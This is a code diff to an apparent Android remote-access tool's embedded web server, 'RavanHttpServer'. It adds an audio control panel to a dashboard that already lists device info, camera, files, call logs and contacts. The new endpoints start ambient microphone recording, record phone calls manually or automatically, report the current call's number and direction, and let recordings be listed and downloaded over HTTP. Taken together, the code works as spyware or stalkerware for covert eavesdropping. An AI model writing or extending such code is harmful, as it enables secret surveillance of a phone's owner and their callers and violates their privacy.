@@ -108,6 +108,7 @@ public class RavanHttpServer extends NanoHTTPD {
             "<a href=\"/\">Home</a>" +
             "<a href=\"/device\">Device Info</a>" +
             "<a href=\"/camera\">Camera</a>" +
+            "<a href=\"/audio\">Audio</a>" +
             "<a href=\"/files\">Files</a>" +
             "<a href=\"/calls\">Call Logs</a>" +
             "<a href=\"/contacts\">Contacts</a>" +
@@ -162,6 +163,22 @@ public class RavanHttpServer extends NanoHTTPD {
                 return serveCameraStatus();
             } else if (uri.startsWith("/download/")) {
                 return serveDownload(uri);
+            } else if (uri.equals("/audio")) {
+                return serveAudioPage();
+            } else if (uri.equals("/audio/mic/start")) {
+                return startMicRecording(params);
+            } else if (uri.equals("/audio/mic/stop")) {
+                return stopMicRecording();
+            } else if (uri.equals("/audio/call/start")) {
+                return startCallRecording(params);
+            } else if (uri.equals("/audio/call/stop")) {
+                return stopCallRecording();
+            } else if (uri.equals("/audio/status")) {
+                return serveAudioStatus();
+            } else if (uri.equals("/audio/settings")) {
+                return updateAudioSettings(params);
+            } else if (uri.equals("/audio/recordings")) {
+                return serveAudioRecordings();
             } else {
                 return serve404();
             }
@@ -225,6 +242,11 @@ public class RavanHttpServer extends NanoHTTPD {
                 +
                 "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128247;</div>" +
                 "<div style=\"color: #e74c3c; font-weight: 600; font-size: 0.9rem;\">Camera</div>" +
+                "</a>" +
+                "<a href=\"/audio\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(26, 188, 156, 0.2), rgba(22, 160, 133, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(26, 188, 156, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#127908;</div>" +
+                "<div style=\"color: #1abc9c; font-weight: 600; font-size: 0.9rem;\">Audio</div>" +
                 "</a>" +
                 "</div>" +
                 "</div>" +
@@ -1480,5 +1502,352 @@ public class RavanHttpServer extends NanoHTTPD {
                 streaming, recording, currentCamera, duration,
                 videoPath != null ? "\"" + videoPath + "\"" : "null");
         return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    // ============ AUDIO/MICROPHONE RECORDING ============
+
+    private Response serveAudioPage() {
+        boolean isRecording = CallRecordService.isRecording();
+        boolean isRecordingCall = CallRecordService.isRecordingCall();
+        boolean isRecordingMic = CallRecordService.isRecordingMic();
+        boolean callInProgress = CallRecordService.isCallInProgress();
+        String callNumber = CallRecordService.getCurrentCallNumber();
+        String callType = CallRecordService.getCurrentCallType();
+        long duration = CallRecordService.getRecordingDuration();
+        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
+        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();
+
+        String html = HTML_HEADER +
+                "<style>" +
+                ".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }"
+                +
+                ".status-active { border-color: #2ecc71; background: rgba(46, 204, 113, 0.1); }" +
+                ".status-inactive { border-color: #e74c3c; background: rgba(231, 76, 60, 0.1); }" +
+                ".status-warning { border-color: #f39c12; background: rgba(243, 156, 18, 0.1); }" +
+                ".btn { padding: 12px 24px; border-radius: 10px; text-decoration: none; display: inline-block; margin: 5px; font-weight: 600; cursor: pointer; border: none; font-size: 0.9rem; }"
+                +
+                ".btn-primary { background: linear-gradient(135deg, #e94560, #ff6b6b); color: white; }" +
+                ".btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; }" +
+                ".btn-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; }" +
+                ".btn-warning { background: linear-gradient(135deg, #f39c12, #e67e22); color: white; }" +
+                ".toggle-container { display: flex; align-items: center; gap: 10px; margin: 10px 0; }" +
+                ".toggle-switch { position: relative; width: 50px; height: 26px; background: #555; border-radius: 13px; cursor: pointer; transition: all 0.3s; }"
+                +
+                ".toggle-switch.active { background: #2ecc71; }" +
+                ".toggle-switch::after { content: ''; position: absolute; width: 22px; height: 22px; border-radius: 50%; background: white; top: 2px; left: 2px; transition: all 0.3s; }"
+                +
+                ".toggle-switch.active::after { left: 26px; }" +
+                ".call-alert { padding: 20px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.3), rgba(39, 174, 96, 0.2)); border-radius: 15px; margin-bottom: 20px; border: 2px solid #2ecc71; animation: pulse 2s infinite; }"
+                +
+                "@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }" +
+                ".recording-indicator { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: rgba(231, 76, 60, 0.2); border-radius: 20px; color: #e74c3c; font-weight: 600; }"
+                +
+                ".recording-dot { width: 10px; height: 10px; background: #e74c3c; border-radius: 50%; animation: blink 1s infinite; }"
+                +
+                "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
+                ".duration { font-size: 1.5rem; font-weight: bold; color: #e94560; }" +
+                "</style>" +
+                "<div class=\"card\">" +
+                "<h2 style=\"margin-bottom: 20px;\">&#127908; Audio Control Panel</h2>";
+
+        // Call in progress alert
+        if (callInProgress) {
+            html += "<div class=\"call-alert\">" +
+                    "<div style=\"display: flex; align-items: center; gap: 15px;\">" +
+                    "<span style=\"font-size: 2rem;\">&#128222;</span>" +
+                    "<div>" +
+                    "<div style=\"font-size: 1.2rem; font-weight: bold; color: #2ecc71;\">" +
+                    (callType.equals("incoming") ? "Incoming Call" : "Outgoing Call") + "</div>" +
+                    "<div style=\"color: #fff;\">" + escapeHtml(callNumber) + "</div>" +
+                    "</div>" +
+                    "</div>" +
+                    "</div>";
+        }
+
+        // Recording status
+        html += "<div class=\"status-card " + (isRecording ? "status-active" : "status-inactive") + "\">" +
+                "<div style=\"display: flex; justify-content: space-between; align-items: center;\">" +
+                "<div>" +
+                "<h3>" + (isRecording ? "&#128308; Recording Active" : "&#9899; Not Recording") + "</h3>";
+
+        if (isRecording) {
+            String recordingType = isRecordingCall ? "Call Recording" : "Microphone Recording";
+            html += "<p style=\"color: #888; margin-top: 5px;\">" + recordingType + "</p>" +
+                    "<div class=\"duration\" id=\"duration\">" + formatDuration((int) duration) + "</div>";
+        }
+
+        html += "</div>" +
+                "<div>" +
+                (isRecording
+                        ? "<a href=\"/audio/" + (isRecordingCall ? "call" : "mic")
+                                + "/stop\" class=\"btn btn-danger\">&#9724; Stop</a>"
+                        : "")
+                +
+                "</div>" +
+                "</div>" +
+                "</div>";
+
+        // Control buttons
+        html += "<div class=\"card\">" +
+                "<h3 style=\"margin-bottom: 15px;\">&#127897; Microphone Recording</h3>" +
+                "<p style=\"color: #888; margin-bottom: 15px;\">Capture ambient audio from device microphone</p>" +
+                "<div>" +
+                "<a href=\"/audio/mic/start\" class=\"btn btn-success\" "
+                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">&#128308; Start Recording</a>" +
+                "<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-warning\" "
+                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 30s</a>" +
+                "<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-warning\" "
+                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 1min</a>" +
+                "<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-warning\" "
+                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 5min</a>" +
+                "</div>" +
+                "</div>";
+
+        // Call recording section
+        html += "<div class=\"card\">" +
+                "<h3 style=\"margin-bottom: 15px;\">&#128222; Call Recording</h3>" +
+                "<p style=\"color: #888; margin-bottom: 15px;\">Record phone calls automatically or manually</p>" +
+                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;\">"
+                +
+                "<div class=\"toggle-container\">" +
+                "<span>Auto-record calls:</span>" +
+                "<a href=\"/audio/settings?auto_record=" + (!autoRecordEnabled) + "&save_on_device="
+                + saveOnDeviceEnabled + "\" style=\"text-decoration: none;\">" +
+                "<div class=\"toggle-switch " + (autoRecordEnabled ? "active" : "") + "\"></div>" +
+                "</a>" +
+                "</div>" +
+                "<div class=\"toggle-container\">" +
+                "<span>Save on device:</span>" +
+                "<a href=\"/audio/settings?auto_record=" + autoRecordEnabled + "&save_on_device="
+                + (!saveOnDeviceEnabled) + "\" style=\"text-decoration: none;\">" +
+                "<div class=\"toggle-switch " + (saveOnDeviceEnabled ? "active" : "") + "\"></div>" +
+                "</a>" +
+                "</div>" +
+                "</div>" +
+                "</div>";
+
+        // View recordings link
+        html += "<div class=\"card\">" +
+                "<h3 style=\"margin-bottom: 15px;\">&#128190; Saved Recordings</h3>" +
+                "<a href=\"/audio/recordings\" class=\"btn btn-primary\">View All Recordings</a>" +
+                "<a href=\"/files/Music/RavanRecordings\" class=\"btn btn-success\">Open in File Manager</a>" +
+                "</div>";
+
+        // Auto-refresh script for status
+        html += "<script>" +
+                "setInterval(function() {" +
+                "  fetch('/audio/status')" +
+                "    .then(r => r.json())" +
+                "    .then(data => {" +
+                "      if (data.isRecording && document.getElementById('duration')) {" +
+                "        var d = data.duration;" +
+                "        var min = Math.floor(d / 60);" +
+                "        var sec = d % 60;" +
+                "        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;" +
+                "      }" +
+                "      if (data.callInProgress && !document.querySelector('.call-alert')) {" +
+                "        location.reload();" +
+                "      }" +
+                "    });" +
+                "}, 2000);" +
+                "</script>";
+
+        html += HTML_FOOTER;
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response startMicRecording(Map<String, String> params) {
+        int duration = 0;
+        if (params.containsKey("duration")) {
+            try {
+                duration = Integer.parseInt(params.get("duration"));
+            } catch (Exception e) {
+                duration = 0;
+            }
+        }
+
+        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        intent.setAction("START_MIC_RECORDING");
+        intent.putExtra("duration", duration);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent);
+        } else {
+            context.startService(intent);
+        }
+
+        // Redirect back to audio page
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response stopMicRecording() {
+        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        intent.setAction("STOP_MIC_RECORDING");
+        context.startService(intent);
+
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response startCallRecording(Map<String, String> params) {
+        String phoneNumber = params.get("number");
+        String callType = params.get("type");
+
+        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        intent.setAction("START_CALL_RECORDING");
+        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
+        intent.putExtra("call_type", callType != null ? callType : "manual");
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent);
+        } else {
+            context.startService(intent);
+        }
+
+        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    private Response stopCallRecording() {
+        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        intent.setAction("STOP_CALL_RECORDING");
+        context.startService(intent);
+
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#9724; Stopping call recording...</h2></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveAudioStatus() {
+        boolean isRecording = CallRecordService.isRecording();
+        boolean isRecordingCall = CallRecordService.isRecordingCall();
+        boolean isRecordingMic = CallRecordService.isRecordingMic();
+        boolean callInProgress = CallRecordService.isCallInProgress();
+        String callNumber = CallRecordService.getCurrentCallNumber();
+        String callType = CallRecordService.getCurrentCallType();
+        long duration = CallRecordService.getRecordingDuration();
+        String recordingPath = CallRecordService.getCurrentRecordingPath();
+        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
+        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();
+
+        String json = String.format(
+                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
+                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
+                        "\"duration\": %d, \"recordingPath\": %s, " +
+                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
+                isRecording, isRecordingCall, isRecordingMic,
+                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
+                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
+                autoRecordEnabled, saveOnDeviceEnabled);
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    private Response updateAudioSettings(Map<String, String> params) {
+        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
+        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));
+
+        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        intent.setAction("UPDATE_SETTINGS");
+        intent.putExtra("auto_record", autoRecord);
+        intent.putExtra("save_on_device", saveOnDevice);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent);
+        } else {
+            context.startService(intent);
+        }
+
+        // Redirect back to audio page
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
+                "<body></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveAudioRecordings() {
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");
+
+        // Get recordings directory
+        File recordDir = new File(Environment.getExternalStoragePublicDirectory(
+                Environment.DIRECTORY_MUSIC), "RavanRecordings");
+
+        if (!recordDir.exists() || !recordDir.isDirectory()) {
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
+        } else {
+            File[] files = recordDir.listFiles(
+                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
+                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));
+
+            if (files == null || files.length == 0) {
+                html.append(
+                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
+            } else {
+                // Sort by date (newest first)
+                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+
+                html.append("<ul class=\"file-list\">");
+
+                int count = 0;
+                for (File file : files) {
+                    if (count >= 50)
+                        break; // Limit to 50 files
+
+                    String fileName = file.getName();
+                    String icon = "&#127897;";
+                    String iconClass = "file-icon-audio";
+
+                    // Determine recording type from filename
+                    String recordType = "Unknown";
+                    if (fileName.startsWith("CALL_incoming")) {
+                        icon = "&#128222;";
+                        recordType = "Incoming Call";
+                    } else if (fileName.startsWith("CALL_outgoing")) {
+                        icon = "&#128222;";
+                        recordType = "Outgoing Call";
+                    } else if (fileName.startsWith("MIC_")) {
+                        icon = "&#127897;";
+                        recordType = "Microphone";
+                    }
+
+                    html.append("<li class=\"file-item\">");
+                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
+                            .append("</div>");
+                    html.append("<div class=\"file-info\">");
+                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
+                    html.append("<div class=\"file-meta\">");
+                    html.append(recordType).append(" - ");
+                    html.append(formatFileSize(file.length())).append(" - ");
+                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
+                            .format(new Date(file.lastModified())));
+                    html.append("</div></div>");
+                    html.append("<a href=\"/download/Music/RavanRecordings/").append(fileName)
+                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
+                    html.append("</li>");
+
+                    count++;
+                }
+
+                html.append("</ul>");
+            }
+        }
+
+        html.append("<div style=\"margin-top: 20px;\">");
+        html.append(
+                "<a href=\"/audio\" style=\"color: #e94560; text-decoration: none;\">&larr; Back to Audio Control</a>");
+        html.append("</div>");
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 }
